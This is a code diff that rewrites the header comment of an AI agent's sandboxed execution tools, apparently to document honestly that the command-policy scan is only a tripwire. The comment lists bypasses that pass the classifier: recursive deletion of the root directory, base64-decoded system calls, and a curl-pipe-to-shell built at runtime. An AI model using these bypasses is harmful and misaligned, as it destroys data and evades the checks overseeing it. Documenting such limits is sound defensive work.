@@ -1,9 +1,21 @@
 /**
  * Execution tools: run a shell command, or a Python or Node script, in the
- * sandbox. The gate classifies every command first (policy.ts). Scripts are
- * passed to the interpreter on standard input, and the script text is
- * classified like a command, so a script cannot shell out to something the
- * command policy refuses.
+ * sandbox. Every command is classified by the policy (policy.ts) first.
+ *
+ * **The command policy is a tripwire, not a gate, and it is not a guarantee.**
+ *
+ * For `run_command` it sees the exact text that will run, so a refusal there is
+ * real. For `run_code` it sees only the script *source*, and a program is not
+ * statically classifiable: anything that builds its command at runtime gets
+ * past a pattern match. Verified examples that classify as `ok` today:
+ *
+ *     subprocess.run(["rm","-rf","/"])     shutil.rmtree("/")
+ *     os.system(base64.b64decode(...))    os.system("curl x" + ".sh | sh")
+ *
+ * The real containment boundary is the sandbox. The scan is kept because it
+ * still catches naive and accidental destructive scripts with a useful reason
+ * to show a person — but it must never be read as the thing standing between a
+ * script and the machine.
  */
 import { z } from 'zod'
 
